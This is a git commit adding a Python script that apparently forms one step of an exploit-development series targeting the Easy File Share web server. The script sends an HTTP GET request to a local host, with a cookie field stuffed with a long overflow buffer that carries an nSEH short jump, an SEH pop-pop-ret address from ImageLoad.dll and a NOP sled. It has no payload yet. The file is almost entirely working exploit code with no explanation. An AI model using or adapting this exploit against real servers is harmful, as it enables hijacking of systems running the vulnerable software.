669fcf7e0cf790d52305780156b562c033b0ba52
bloggins <bloggins.jason@gmail.com>
2020-07-18 21:13:42 -0400

    Add files via upload

---
+++ 3.SEH-Easy-File-Share/5.py
@@ -0,0 +1,28 @@
+import socket
+import os
+import sys
+
+ip = '127.0.0.1'
+port = 80
+
+#0x1001416d : pop ebp # pop ebx # ret  | ascii {PAGE_EXECUTE_READ} [ImageLoad.dll]
+#jump  EB06
+seh = "\x6d\x41\x01\x10"
+nseh = "\xeb\x06\x90\x90"
+
+stuff = "A"*4059 + nseh + seh + "\x90"*1000
+
+buffer =  "GET /vfolder.ghp HTTP/1.1\r\n"
+buffer += "User-Agent: Mozilla/5.0\r\n"
+buffer += "Host:" + ip + ":" + "port" + "\r\n"
+buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+buffer += "Accept-Language: en-us\r\n"
+buffer += "Accept-Encoding: gzip, deflate\r\n"
+buffer += "Referer: http://" + ip + "/\r\n"
+buffer += "Cookie: SESSIONID=6771; UserID=" + stuff	+ "; PassWD=;\r\n"
+buffer += "Conection: Keep-Alive\r\n\r\n"
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((ip, port))
+s.send(buffer)
+s.close()
